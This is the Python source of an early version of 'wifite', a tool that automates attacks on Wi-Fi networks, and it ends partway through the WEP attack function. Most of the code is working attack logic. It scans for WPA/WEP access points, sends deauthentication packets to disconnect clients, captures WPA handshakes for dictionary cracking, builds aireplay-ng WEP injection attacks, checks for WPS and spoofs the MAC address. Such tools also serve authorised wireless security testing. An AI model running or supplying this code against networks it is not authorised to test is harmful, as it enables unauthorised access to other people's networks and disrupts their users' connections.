#!/usr/bin/python

"""
	wifite
	
	author: derv82 at gmail
	
	TODO:
	 * rtl8187 fix needs to take iface out of monitor mode!
	 
	 * Command line arguments. Seriously.
	 
	 * WEP - ability to pause/skip/continue	 
	 * Unknown SSID's : Send deauth's (when on fixed channel) to unmask!
	 
	 * Option to "analyze" or "check" cap files for handshakes.
	   Shows output from other programs like tshark, cowpatty, pyrit, aircrack.
	   
	 * reaver:
	 	 MONITOR ACTIVITY!
	   - Ensure WPS key attempts have begun. 
	   - If no attempts can be made, stop attack and print
	   
	   - During attack, if no attempts are made within X minutes, stop attack & Print
	   
	   - Output when unable to associate:
	     [!] WARNING: Failed to associate with AA:BB:CC:DD:EE:FF (ESSID: ABCDEF)
	
	MIGHTDO:
	  * WPA - crack (pyrit/cowpatty) (not really important)
"""

# For command-line arguments
from sys import argv
# For flushing STDOUT
from sys import stdout, stdin

# For file management
import os

from shutil import copy

# For executing and reading processes
from subprocess import Popen, call, PIPE

# For killing processes
from signal import SIGTERM, SIGINT

import time

# regular expressions - for converting SSID to filename
import re

# For generating a random MAC address.
import random

################################
# GLOBAL VARIABLES IN ALL CAPS #
################################

REVISION = 83

# WPA variables
STRIP_HANDSHAKE      = True # Use pyrit or tshark (if applicable) to strip handshake
WPA_DEAUTH_TIMEOUT   = 10   # Time to wait between deauthentication bursts (in seconds)
WPA_ATTACK_TIMEOUT   = 500  # Total time to allow for a handshake attack (in seconds)
HANDSHAKE_DIR        = 'hs' # Directory in which handshakes .cap files are stored
# Strip file path separator if needed
if HANDSHAKE_DIR[-1] == os.sep: HANDSHAKE_DIR = HANDSHAKE_DIR[:-1]
WPA_FINDINGS         = [] # List of strings containing info on successful WPA attacks
WPA_DONT_CRACK       = False # Flag to disable cracking of handshakes
WPA_DICTIONARY       = '/pentest/web/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
if not os.path.exists(WPA_DICTIONARY): WPA_DICTIONARY = ''
WPA_HANDSHAKE_TSHARK   = True # Various programs to use to check for a handshake.
WPA_HANDSHAKE_PYRIT    = True
WPA_HANDSHAKE_AIRCRACK = True
WPA_HANDSHAKE_COWPATTY = True
WPA_HANDSHAKE_DISABLE  = True

# WEP variables
WEP_PPS             = 600 # packets per second (Tx rate)
WEP_TIMEOUT         = 60 # Amount of time to give each attack
WEP_ARP_REPLAY      = True # Various WEP-based attacks via aireplay-ng
WEP_CHOPCHOP        = False #True
WEP_FRAGMENT        = False #True
WEP_CAFFELATTE      = False #True
WEP_CRACK_AT_IVS    = 10000 # Number of IVS at which we start cracking
WEP_IGNORE_FAKEAUTH = True
WEP_FINDINGS        = [] # List of strings containing info on successful WEP attacks.

# WPS variables
WPS_ONLY            = True # Target only WPS-enabled routers
WPS_FINDINGS        = []
WPS_DISABLE         = False # Flag to disable WPS attacks

# Program variables
IFACE_TO_TAKE_DOWN = '' # Interface that wifite puts into monitor mode
                        # It's our job to put it out of monitor mode after the attacks
ORIGINAL_IFACE_MAC = ('', '') # Original interface name[0] and MAC address[1] (before spoofing)
DO_NOT_CHANGE_MAC  = True # Flag for disabling MAC anonymizer
TARGETS_REMAINING  = 0  # Number of access points remaining to attack
WPA_CAPS_TO_CRACK  = [] # list of .cap files to crack (full of CapFile objects)
THIS_MAC           = '' # The interfaces current MAC address.

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray


# Create temporary directory
from tempfile import mkdtemp
temp = mkdtemp(prefix='wifite')
if not temp.endswith(os.sep):
	temp += os.sep

# /dev/null, to send output from programs so they don't print to screen.
DN = open(os.devnull, 'w')

class CapFile:
	"""
		Holds data about an access point's .cap file, including AP's ESSID & BSSID.
	"""
	def __init__(self, filename, ssid, bssid):
		self.filename = filename
		self.ssid = ssid
		self.bssid = bssid

class Target:
	"""
		Holds data for a Target (aka Access Point aka Router)
	"""
	def __init__(self, bssid, power, data, channel, encryption, ssid):
		self.bssid = bssid
		self.power = power
		self.data  = data
		self.channel = channel
		self.encryption = encryption
		self.ssid = ssid
		self.wps = False # Default to non-WPS-enabled router.
	
class Client:
	"""
		Holds data for a Client (device connected to Access Point/Router)
	"""
	def __init__(self, bssid, station, power):
		self.bssid   = bssid
		self.station = station
		self.power   = power


def rtl8187_fix(iface):
	"""
		Attempts to solve "Unknown error 132" common with RTL8187 devices.
		Puts down interface, unloads/reloads driver module, then puts iface back up.
		Returns True if fix was attempted, False otherwise.
	"""
	
	# Check if current interface is using the RTL8187 chipset
	proc_airmon = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
	proc_airmon.wait()
	using_rtl8187 = False
	for line in proc_airmon.communicate()[0].split():
		line = line.upper()
		if line.strip() == '' or line.startswith('INTERFACE'): continue
		if line.find(iface.upper()) and line.find('RTL8187') != -1: using_rtl8187 = True
	
	if not using_rtl8187: 
		# Display error message and exit
		print O + '[!]' + R + ' unable to generate airodump-ng CSV file' + W
		print O + '[!]' + R + ' you may want to disconnect/reconnect your wifi device' + W
		exit_gracefully(1)
	
	print " [+] attempting " + G + "RTL8187 'Unknown Error 132'" + W + " fix...",
	stdout.flush()
	call(['rmmod', 'rtl8187'], stdout=DN, stderr=DN)
	call(['rfkill', 'block', 'all'], stdout=DN, stderr=DN)
	call(['rfkill', 'unblock', 'all'], stdout=DN, stderr=DN)
	call(['modprobe', 'rtl8187'], stdout=DN, stderr=DN)
	time.sleep(1)
	call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
	time.sleep(1)
	print 'done'
	return True


def wps_check_targets(targets, cap_file):
	"""
		Uses reaver's "walsh" program to check access points in cap_file
		for WPS functionality. Sets "wps" field of targets that match to True.
	"""
	if not program_exists('walsh'): return
	if len(targets) == 0 or not os.path.exists(cap_file): return
	print ' [+] checking for '+G+'WPS compatibility'+W+'...',
	
	cmd = ['walsh',
	       '-f', cap_file,
	       '-C'] # ignore Frame Check Sum errors
	proc_walsh = Popen(cmd, stdout=PIPE, stderr=DN)
	proc_walsh.wait()
	for line in proc_walsh.communicate()[0].split('\n'):
		if line.strip() == '' or line.startswith('Scanning for'): continue
		bssid = line.split(' ')[0]
		
		for t in targets:
			if t.bssid.lower() == bssid.lower():
				t.wps = True
	
	
	# Remove non-WPS-enabled access points from list of targets
	"""
	if WPS_ONLY:
		for i in xrange(0, len(targets)):
			if not targets[i].wps:
				targets.remove(i)
				i -= 1
	"""
	print 'done'


def scan(channel=0, iface='', tried_rtl8187_fix=False):
	"""
		Scans for access points. Asks user to select target(s).
			"channel" - the channel to scan on, 0 scans all channels.
			"iface"   - the interface to scan on. must be a real interface.
			"tried_rtl8187_fix" - We have already attempted to fix "Unknown error 132"
		Returns list of selected targets and list of clients.
	"""
	remove_airodump_files(temp + 'wifite')
	
	command = ['airodump-ng', 
	           '-a', # only show associated clients
	           '-w', temp + 'wifite'] # output file
	if channel != 0:
		command.append('-c')
		command.append(str(channel))
	command.append(iface)
	proc = Popen(command, stdout=DN, stderr=DN)
	
	time_started = time.time()
	print ' [+] '+G+'initializing scan'+W+', updates at 5 second intervals, '+G+'CTRL+C'+W+' when ready.'
	(targets, clients) = ([], [])
	try:
		while True:
			time.sleep(0.3)
			if not os.path.exists(temp + 'wifite-01.csv'):
				
				# RTL8187 Unknown Error 132 FIX
				if proc.poll() != None: # Check if process has finished
					
					if not tried_rtl8187_fix and proc.communicate()[1].find('failed: Unknown error 132') != -1:
						if rtl8187_fix(iface):
							return scan(channel=channel, iface=iface, tried_rtl8187_fix=True)
				print R+' [!]'+O+' wifite is unable to generate airodump-ng output files'+W
				print R+' [!]'+O+' you may want to disconnect/reconnect your wifi device'+W
				exit_gracefully(1)
				
			(targets, clients) = parse_csv(temp + 'wifite-01.csv')
			print '\r %s %s wireless networks. %s target%s and %s client%s found' % (
			      sec_to_hms(time.time() - time_started), G+'scanning'+W, 
			      G+str(len(targets))+W, '' if len(targets) == 1 else 's', 
			      G+str(len(clients))+W, '' if len(clients) == 1 else 's'),
			stdout.flush()
	except KeyboardInterrupt: 
		print ''
		stdout.flush()
	
	send_interrupt(proc)
	try: os.kill(proc.pid, SIGTERM)
	except OSError: pass
	except UnboundLocalError: pass
	
	# Use "walsh" program to check for WPS compatibility
	if not WPS_DISABLE:
		wps_check_targets(targets, temp + 'wifite-01.cap')
	
	remove_airodump_files(temp + 'wifite')
	
	print ''
	
	if len(targets) == 0:
		print R+' [!]'+O+' no targets found!'+W
		print R+' [!]'+O+' you may need to wait for targets to show up.'+W
		print ''
		exit_gracefully(1)
	
	# Sort by Power
	targets = sorted(targets, key=lambda t: t.power, reverse=True)
	
	victims = []
	print "   NUM ESSID                            ENCR   POWER  WPS?"
	print '   --- -------------------------------- -----  -----  ----'
	for i, target in enumerate(targets):
		print "   %s%2d%s " % (G, i + 1, W),
		print "%s" % C+target.ssid.ljust(32)+W,
		if target.encryption.find("WEP") != -1: print G,
		else:                                   print O,
		print "\b%3s" % target.encryption.strip().ljust(4) + W,
		if target.power >= 55:   print G,
		elif target.power >= 40: print O,
		else:                    print R,
		print "%3ddb%s" % (target.power, W),
		print "  %3s" % (G+'yes'+W if target.wps else '   '),
		client_text = ''
		for c in clients:
			if c.station == target.bssid: 
				if client_text == '': client_text = 'CLIENT'
				elif client_text[-1] != "S": client_text += "S"
		if client_text != '': print '*%s*' % client_text
		else: print ''
	
	ri = raw_input(" [+] select "+G+"target numbers"+W+" ("+G+"1-%s)" % (str(len(targets))+W) + \
	                     " separated by commas, or '%s': " % (G+'all'+W))
	if ri.strip().lower() == 'all':
		victims = targets[:]
	else:
		for r in ri.split(','):
			r = r.strip()
			if r.find('-') != -1:
				(sx, sy) = r.split('-')
				if sx.isdigit() and sy.isdigit():
					x = int(sx)
					y = int(sy) + 1
					for v in xrange(x, y):
						victims.append(targets[v - 1])
			elif not r.isdigit():
				print O + "[!]" + R + " not a number: %s " + W % (r)
			else:
				victims.append(targets[int(r) - 1])
		
	if len(victims) == 0:
		print O + '[!]' + R + ' no targets selected. exiting'
		exit_gracefully(0)
	
	print ''
	print ' [+] %s%d%s target%s selected.' % (G, len(victims), W, '' if len(victims) == 1 else 's')
	
	return (victims, clients)

def parse_csv(filename):
	"""
		Parses given lines from airodump-ng CSV file.
		Returns tuple: List of targets and list of clients.
	"""
	if not os.path.exists(filename): return ([], [])
	try:
		f = open(filename, 'r')
		lines = f.read().split('\n')
		f.close()
	except IOError: return ([], [])
	
	hit_clients = False
	targets = []
	clients = []
	for line in lines:
		if line.startswith('Station MAC,'): hit_clients = True
		if line.startswith('BSSID') or line.startswith('Station MAC') or line.strip() == '': continue
		if not hit_clients: # Access points
			c = line.split(', ', 13)
			cur = 11
			c[cur] = c[cur].strip()
			if not c[cur].isdigit(): cur += 1
			ssid = c[cur+1]
			ssidlen = int(c[cur])
			ssid = ssid[:ssidlen]
			power = int(c[cur-4])
			if power < 0: power += 100
			t = Target(c[0], power, c[cur-2].strip(), c[3], c[5].replace("2WPA", ""), ssid)
			# Ignore non-WPA/WEP networks.
			if c[5].find('WPA') == -1 and c[5].find('WEP') == -1: continue
			targets.append(t)
		else: # Connected clients
			c = line.split(', ')
			bssid   = re.sub(r'[^a-zA-Z0-9:]', '', c[0])
			station = re.sub(r'[^a-zA-Z0-9:]', '', c[5])
			power   = c[3]
			if station != 'notassociated':
				c = Client(bssid, station, power)
				clients.append(c)
	return (targets, clients)



def enable_monitor_mode(iface):
	"""
		Uses airmon-ng to put a device into Monitor Mode.
		Then uses the get_iface() method to retrieve the new interface's name.
		Sets global variable IFACE_TO_TAKE_DOWN as well.
		Returns the name of the interface in monitor mode.
	"""
	global IFACE_TO_TAKE_DOWN
	print ' [+] enabling monitor mode on %s...' % (G+iface+W),
	stdout.flush()
	call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
	print 'done'
	IFACE_TO_TAKE_DOWN = get_iface()
	return IFACE_TO_TAKE_DOWN


def disable_monitor_mode():
	"""
		The program may have enabled monitor mode on a wireless interface.
		We want to disable this before we exit, so we will do that.
	"""
	if IFACE_TO_TAKE_DOWN == '': return
	print ' [+] disabling monitor mode on %s...' % (G+IFACE_TO_TAKE_DOWN+W),
	stdout.flush()
	call(['airmon-ng', 'stop', IFACE_TO_TAKE_DOWN], stdout=DN, stderr=DN)
	print 'done'


def get_iface():
	"""
		Get the wireless interface in monitor mode. 
		Defaults to only device in monitor mode if found.
		Otherwise, enumerates list of possible wifi devices
		and asks user to select one to put into monitor mode (if multiple).
		Uses airmon-ng to put device in monitor mode if needed.
		Returns the name (string) of the interface chosen in monitor mode.
	"""
	proc  = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
	iface = ''
	monitors = []
	for line in proc.communicate()[0].split('\n'):
		if len(line) == 0: continue
		if ord(line[0]) != 32: # Doesn't start with space
			iface = line[:line.find(' ')] # is the interface
		if line.find('Mode:Monitor') != -1:
			monitors.append(iface)
	
	# only one device
	if len(monitors) == 1: return monitors[0]
	elif len(monitors) > 1:
		print " [+] interfaces in "+G+"monitor mode:"+W
		for i, monitor in enumerate(monitors):
			print "  %s. %s" % (G+str(i+1)+W, G+monitor+W)
		ri = raw_input(" [+] select "+G+"number"+W+" of interface to use for capturing ("+G+"1-%d%s): "+G % len(monitors), W)
		while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
			ri = raw_input(" [+] select number of interface to use for capturing (1-%d): "+G % len(monitors))
		i = int(ri)
		return monitors[i - 1]
	
	proc  = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
	for line in proc.communicate()[0].split('\n'):
		if len(line) == 0 or line.startswith('Interface'): continue
		monitors.append(line[:line.find('\t')])
	
	if len(monitors) == 0:
		print O + '[!]' + R + " no wireless interfaces were found." + W
		print O + '[!]' + R + " you need to plug in a wifi device or install drivers." + W
		exit_gracefully(0)
	
	elif len(monitors) == 1:
		mac_anonymize(monitors[0])
		
		return enable_monitor_mode(monitors[0])
		
		IFACE_TO_TAKE_DOWN = get_iface() # recursive call
		return IFACE_TO_TAKE_DOWN
	
	print " [+] wireless devices:"
	for i, monitor in enumerate(monitors):
		print "  %d. %s" % (i + 1, monitor)
	print " [+] select number of device to put into monitor mode (1-%d):" % len(monitors),
	stdout.flush()
	ri = raw_input()
	while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
		print " [+] select number of device to put into monitor mode (1-%d):" % len(monitors),
		ri = raw_input()
	i = int(ri)
	mac_anonymize(monitors[i-1])
	
	enable_monitor_mode(monitors[i-1])
	

def handle_args():
	"""
		Handles command-line arguments, sets variables.
	"""
	args = argv[1:]
	# TODO allow user to set global variables
	for i in xrange(0, len(args)):
		print "%d='%s'" % (i, args[i])


def has_handshake(target, capfile):
	"""
		Checks if .cap file contains a handshake.
		Returns True if handshake is found, False otherwise.
	"""
	
	valid_handshake = True
	tried = False
	
	if WPA_HANDSHAKE_TSHARK and program_exists('tshark'):
		# Call Tshark to return list of EAPOL packets in cap file.
		tried = True
		cmd = ['tshark',
		       '-r', capfile, # Input file
		       '-R', 'eapol', # Filter (only EAPOL packets)
		       '-n']          # Do not resolve names (MAC vendors)
		proc = Popen(cmd, stdout=PIPE, stderr=DN)
		proc.wait()
		lines = proc.communicate()[0].split('\n')
		
		tshark_handshake = False
		# Get list of all clients in cap file
		clients = []
		for line in lines:
			if line.find('appears to have been cut short') != -1 or line.find('Running as user "root"') != -1 or line.strip() == '':
				continue
			
			while line.startswith(' '):  line = line[1:]
			while line.find('  ') != -1: line = line.replace('  ', ' ')
			
			fields = line.split(' ')
			src = fields[2].lower()
			dst = fields[4].lower()
			
			if src == target.bssid.lower() and clients.count(dst) == 0: clients.append(dst)
			elif dst == target.bssid.lower() and clients.count(src) == 0: clients.append(src)
		
		# Check each client for a handshake
		for client in clients:
			msg_num = 1 # Index of message in 4-way handshake (starts at 1)
			
			for line in lines:
				if line.find('appears to have been cut short') != -1: continue
				if line.find('Running as user "root"') != -1: continue
				if line.strip() == '': continue
				
				# Sanitize tshark's output, separate into fields
				while line[0] == ' ': line = line[1:]
				while line.find('  ') != -1: line = line.replace('  ', ' ')
				
				fields = line.split(' ')
				
				# Sometimes tshark doesn't display the full header for "Key (msg 3/4)" on the 3rd handshake.
				# This catches this glitch and fixes it.
				if len(fields) < 8: 
					continue
				elif len(fields) == 8:
					fields.append('(msg')
					fields.append('3/4)')
				
				src = fields[2].lower() # Source MAC address
				dst = fields[4].lower() # Destination MAC address
				msg = fields[9][0]      # The message number (1, 2, 3, or 4)
				
				# First, third msgs in 4-way handshake are from the target to client
				if msg_num % 2 == 1 and (src != target.bssid.lower() or dst != client): continue
				# Second, fourth msgs in 4-way handshake are from client to target
				elif msg_num % 2 == 0 and (dst != target.bssid.lower() or src != client): continue
				
				# The messages must appear in sequential order.
				try:
					if int(msg) != msg_num: continue
				except ValueError: continue
				
				msg_num += 1
				
				# We need the first 4 messages of the 4-way handshake
				# Although aircrack-ng cracks just fine with only 3 of the messages...
				if msg_num >= 4:
					tshark_handshake = True
		valid_handshake = valid_handshake and tshark_handshake
	
	# Use CowPatty to check for handshake.
	if valid_handshake and WPA_HANDSHAKE_COWPATTY and program_exists('cowpatty'):
		tried = True
		# Call cowpatty to check if capfile contains a valid handshake.
		cmd = ['cowpatty',
		       '-r', capfile,     # input file
		       '-s', target.ssid, # SSID
		       '-2',              # Uses frames 1, 2, or 3 for key attack (nonstrict)
		       '-c']              # Check for handshake
		proc = Popen(cmd, stdout=PIPE, stderr=DN)
		proc.wait()
		response = proc.communicate()[0]
		if response.find('incomplete four-way handshake exchange') != -1:
			valid_handshake = False
		elif response.find('Unsupported or unrecognized pcap file.') != -1:
			valid_handshake = False
		elif response.find('Unable to open capture file: Success') != -1:
			valid_handshake = False
		
	# Check for handshake using Pyrit if applicable
	if valid_handshake and WPA_HANDSHAKE_PYRIT and program_exists('pyrit'):
		tried = True
		# Call pyrit to "Analyze" the cap file's handshakes.
		cmd = ['pyrit',
		       '-r', capfile,
		       'analyze']
		proc = Popen(cmd, stdout=PIPE, stderr=DN)
		proc.wait()
		hit_essid = False
		pyrit_valid = False
		for line in proc.communicate()[0].split('\n'):
			# Iterate over every line of output by Pyrit
			if line == '' or line == None: continue
			if line.find("AccessPoint") != -1:
				hit_essid = (line.find("('" + target.ssid + "')") != -1) and \
				            (line.lower().find(target.bssid.lower()) != -1)
				#hit_essid = (line.lower().find(target.bssid.lower()))
			
			else:
				# If Pyrit says it's good or workable, it's a valid handshake.
				if hit_essid and (line.find(', good, ') != -1 or \
				                  line.find(', workable, ') != -1):
					                # or line.find(', bad, ') != -1):
					pyrit_valid = True
		valid_handshake = valid_handshake and pyrit_valid
	
	# Check for handshake using aircrack-ng
	if valid_handshake and WPA_HANDSHAKE_AIRCRACK and program_exists('aircrack-ng'):
		tried = True
		crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target.bssid + ' ' + capfile
		proc_crack = Popen(crack, stdout=PIPE, stderr=DN, shell=True)
		proc_crack.wait()
		txt = proc_crack.communicate()[0]
		
		valid_handshake = valid_handshake and (txt.find('Passphrase not in dictionary') != -1)
	
	if tried:
		return valid_handshake
	else:
		print R+' [!] unable to check for handshake: no handshake options are enabled.'
		return False


def remove_airodump_files(prefix):
	"""
		Removes airodump output files for whatever file prefix ('wpa', 'wep', etc)
		Used by wpa_get_handshake() and attack_wep()
	"""
	remove_file(prefix + '-01.cap')
	remove_file(prefix + '-01.csv')
	remove_file(prefix + '-01.kismet.csv')
	remove_file(prefix + '-01.kismet.netxml')
	for filename in os.listdir(temp):
		if filename.lower().endswith('.xor'): remove_file(temp + filename)
	for filename in os.listdir('.'):
		if filename.startswith('replay_') and filename.endswith('.cap'):
			remove_file(filename)
		if filename.endswith('.xor'): remove_file(filename)
	


def remove_file(filename):
	"""
		Attempts to remove a file. Does not throw error if file not found.
	"""
	try: os.remove(filename)
	except OSError: pass


def program_exists(program):
	"""
		Uses 'which' (linux command) to check if a program is installed.
	"""
	proc = Popen(['which', program], stdout=PIPE)
	return proc.communicate()[0].strip() != ''


def strip_handshake(capfile):
	"""
		Uses Tshark or Pyrit to strip all non-handshake packets from a .cap file
		File in location 'capfile' is overwritten!
	"""
	output_file = capfile
	if program_exists('pyrit'):
		cmd = ['pyrit',
		     '-r', capfile,
		     '-o', output_file,
		     'strip']
		call(cmd,stdout=DN, stderr=DN)
		
	elif program_exists('tshark'):
		# strip results with tshark
		cmd = ['tshark',
		       '-r', capfile,      # input file
		       '-R', 'eapol || wlan_mgt.tag.interpretation', # filter
		       '-w', capfile + '.temp'] # output file
		proc_strip = call(cmd, stdout=DN, stderr=DN)
		
		os.rename(capfile + '.temp', output_file)
		
	else:
		print " unable to strip .cap file: neither pyrit nor tshark were found"


def wpa_get_handshake(iface, target, clients):
	"""
		Opens an airodump capture on the target, dumping to a file.
		During the capture, sends deauthentication packets to the target both as
		general deauthentication packets and specific packets aimed at connected clients.
		Waits until a handshake is captured.
			"iface"   - interface to capture on
			"target"  - Target object containing info on access point
			"clients" - List of Client objects associated with the target
		Returns True if handshake was found, False otherwise
	"""
	global TARGETS_REMAINING
	
	# Generate the filename to save the .cap file as
	save_as = HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid+'_'+target.bssid) + '.cap'
	
	# Check if we already have a handshake for this SSID... If we do, generate a new filename
	if os.path.exists(save_as):
		save_index = 1
		while os.path.exists(HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '-' + str(save_index) + '.cap'):
			save_index += 1
		save_as = HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid+'_'+target.bssid) + '-' + str(save_index) + '.cap'
		
	# Remove previous airodump output files (if needed)
	remove_airodump_files(temp + 'wpa')
	
	result = ''
	
	# Start of large Try-Except; used for catching keyboard interrupt (Ctrl+C)
	try:
		# Start airodump-ng process to capture handshakes
		cmd = ['airodump-ng', 
		      '-w', temp + 'wpa', 
		      '-c', target.channel, 
		      '--bssid', target.bssid, iface]
		proc_read = Popen(cmd, stdout=DN, stderr=DN)
		
		# Setting deauthentication process here to avoid errors later on
		proc_deauth = None
		
		print ' %s starting %swpa handshake capture%s on "%s"' % (sec_to_hms(WPA_ATTACK_TIMEOUT), G, W, G+target.ssid+W)
		got_handshake = False
		
		seconds_running = 0
		
		target_clients = clients[:]
		client_index = -1
		
		# Deauth and check-for-handshake loop
		while not got_handshake and seconds_running < WPA_ATTACK_TIMEOUT:
			
			time.sleep(1)
			seconds_running += 1
			
			print "                                                         \r",
			print ' %s listening for handshake...\r' % (sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running)),
			stdout.flush()
			
			if seconds_running % WPA_DEAUTH_TIMEOUT == 0: 
				# Send deauth packets via aireplay-ng
				cmd = ['aireplay-ng', 
				      '-0',  # Attack method (Deauthentication)
				       '3',  # Number of packets to send
				      '-a', target.bssid]
				
				client_index += 1
				
				if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):
					print " %s sending 3 deauth to %s*broadcast*%s..." % \
					         (sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running), G, W),
					client_index = -1
				else:
					print " %s sending 3 deauths to %s... " % \
					         (sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running), \
					         G+target_clients[client_index].bssid+W),
					cmd.append('-h')
					cmd.append(target_clients[client_index].bssid)
				cmd.append(iface)
				stdout.flush()
				
				# Send deauth packets via aireplay, wait for them to complete.
				proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
				proc_deauth.wait()
				print "sent\r",
				stdout.flush()
			
			# Copy current dump file for consistency
			if not os.path.exists(temp + 'wpa-01.cap'): continue
			copy(temp + 'wpa-01.cap', temp + 'wpa-01.cap.temp')
			
			# Save copy of cap file
			#remove_file('/root/new/wpa-01.cap')
			#copy(temp + 'wpa-01.cap', '/root/new/wpa-01.cap')
			
			# Check for handshake
			if has_handshake(target, temp + 'wpa-01.cap.temp'):
				got_handshake = True
				
				try: os.mkdir(HANDSHAKE_DIR + os.sep)
				except OSError: pass
				
				# Kill the airodump and aireplay processes
				send_interrupt(proc_read)
				send_interrupt(proc_deauth)
				
				os.rename(temp + 'wpa-01.cap.temp', save_as)
				
				print '\n %s %shandshake captured%s! saved as "%s"' % (sec_to_hms(seconds_running), G, W, G+save_as+W)
				WPA_FINDINGS.append('%s (%s) handshake captured' % (target.ssid, target.bssid))
				WPA_FINDINGS.append('stored at %s' % (save_as))
				WPA_FINDINGS.append('')
				
				# Strip handshake if needed
				if STRIP_HANDSHAKE: strip_handshake(save_as)
				
				# Add the filename and SSID to the list of 'to-crack'
				# Cracking will be handled after all attacks are finished.
				WPA_CAPS_TO_CRACK.append(CapFile(save_as, target.ssid, target.bssid))
				
				break # Break out of while loop
				
			# No handshake yet
			os.remove(temp + 'wpa-01.cap.temp')
			
			# Check the airodump output file for new clients
			for client in parse_csv(temp + 'wpa-01.csv')[1]:
				if client.station != target.bssid: continue
				new_client = True
				for c in target_clients:
					if client.bssid == c.bssid: 
						new_client = False
						break
				
				if new_client:
					print " %s %snew client%s found: %s                         " % \
					       (sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running), G, W, \
					       G+client.bssid+W)
					target_clients.append(client)
			
		# End of Handshake wait loop.
		
		if not got_handshake:
			print R+' [0:00:00] '+O+'unable to capture handshake in time'+W
	
	except KeyboardInterrupt: 
		print R+'\n (^C)'+O+' WPA handshake capture interrupted'+W
		# If there are more targets to attack, ask what to do next
		if TARGETS_REMAINING > 0:
			print "\n %s%d%s target%s remain%s" % (G, TARGETS_REMAINING, W,
			            '' if TARGETS_REMAINING == 1 else 's', 
			            's' if TARGETS_REMAINING == 1 else '')
			print " please make a selection:"
			print G+"   [c]ontinue"+W+" attacking targets"
			if len(WPA_CAPS_TO_CRACK) > 0:
				print O+"   [s]kip"+W+" to cracking WPA cap files"
			print R+"   [e]xit"+W+" completely"
			ri = ''
			while ri != 'c' and ri != 's' and ri != 'e': 
				ri = raw_input()
			
			if ri == 's': TARGETS_REMAINING = 0 # Tells start() to ignore other attacks
			elif ri == 'e':
				exit_gracefully(0)
		
	# clean up
	remove_airodump_files(temp + 'wpa')
	send_interrupt(proc_read)
	send_interrupt(proc_deauth)
	
	return got_handshake


def wep_fake_auth(iface, target):
	"""
		Attempt to (falsely) authenticate with a WEP access point.
		Gives 10 seconds to make 5 authentication attempts.
		Returns True if authentication was successful, False otherwise.
	"""
	max_wait = 10
	cmd = ['aireplay-ng',
	       '-1', '0',          # Fake authentication, no delay
	       '-a', target.bssid,
	       '-T', '5',          # Make 5 attempts
	       iface]
	proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=DN)
	started = time.time()
	while proc_fakeauth.poll() == None and time.time() - started <= max_wait:  pass
	if time.time() - started > max_wait: 
		send_interrupt(proc_fakeauth)
		return False
	
	result = proc_fakeauth.communicate()[0].lower()
	if result.find('switching to shared key') != -1 or \
	   result.find('rejects open system'): pass
	   # TODO Shared Key Authentication (SKA)
	
	return result.find('association successful') != -1

def get_aireplay_command(iface, attack_num, target, clients, client_mac):
	"""
		Returns aireplay-ng command line arguments based on parameters.
	"""
	cmd = ''
	if attack_num == 0:
		cmd = ['aireplay-ng',
		       '--arpreplay',
		       '-b', target.bssid,
		       '-x', str(WEP_PPS)] # Packets per second
		if client_mac != '': 
			cmd.append('-h')
			cmd.append(client_mac)
		elif len(clients) > 0: 
			cmd.append('-h')
			cmd.append(clients[0].bssid)
		cmd.append(iface)
		
	elif attack_num == 1:
		cmd = ['aireplay-ng',
		       '--chopchop',
		       '-b', target.bssid,
		       '-x', str(WEP_PPS), # Packets per second
		       '-m', '100', # Minimum packet length (bytes)
		       '-F'] # Automatically choose the first packet
		if client_mac != '': 
			cmd.append('-h')
			cmd.append(client_mac)
		elif len(clients) > 0: 
			cmd.append('-h')
			cmd.append(clients[0].bssid)
		cmd.append(iface)
		
	elif attack_num == 2:
		cmd = ['aireplay-ng',
		       '--fragment',
		       '-b', target.bssid,
		       '-x', str(WEP_PPS), # Packets per second
		       '-m', '100', # Minimum packet length (bytes)
		       '-F'] # Automatically choose the first packet
		if client_mac != '': 
			cmd.append('-h')
			cmd.append(client_mac)
		elif len(clients) > 0: 
			cmd.append('-h')
			cmd.append(clients[0].bssid)
		cmd.append(iface)
	
	elif attack_num == 3:
		if len(clients) == 0:
			print R+' [0:00:00] unable to carry out caffe-latte attack: '+O+'no clients'
			return ''
		cmd = ['aireplay-ng',
		       '--interactive',
		       '-b', target.bssid,
		       '-h', clients[0].bssid,
		       '-x', str(WEP_PPS), # Packets per second
		       '-T', '1', # Minimum packet length (bytes)
		       '-F',      # Automatically choose the first packet
		       '-p', '0841',
		       'iface'] 
		cmd.append(iface)
	return cmd


def wep_send_deauths(iface, target, clients):
	"""
		Sends deauth packets to broadcast and every client.
	"""
	# Send deauth to broadcast
	cmd = ['aireplay-ng',
	       '--deauth', '1',
	       '-a', target.bssid,
	       iface]
	call(cmd, stdout=DN, stderr=DN)
	# Send deauth to every client
	for client in clients:
		cmd = ['aireplay-ng',
			     '--deauth', '1',
			     '-a', target.bssid,
			     '-h', client.bssid,
			     iface]
		call(cmd, stdout=DN, stderr=DN)


def sec_to_hms(sec):
	"""
		Converts integer sec to h:mm:ss format
	"""
	h = sec / 3600
	sec %= 3600
	m  = sec / 60
	sec %= 60
	return '[%d:%02d:%02d]' % (h, m, sec)


def attack_wep(iface, target, clients):
	"""
		Attacks WEP-encrypted network.
		Returns True if key was successfully found, False otherwise.
	"""
	
	total_attacks = 3 + (1 if len(clients) > 0 else 0)
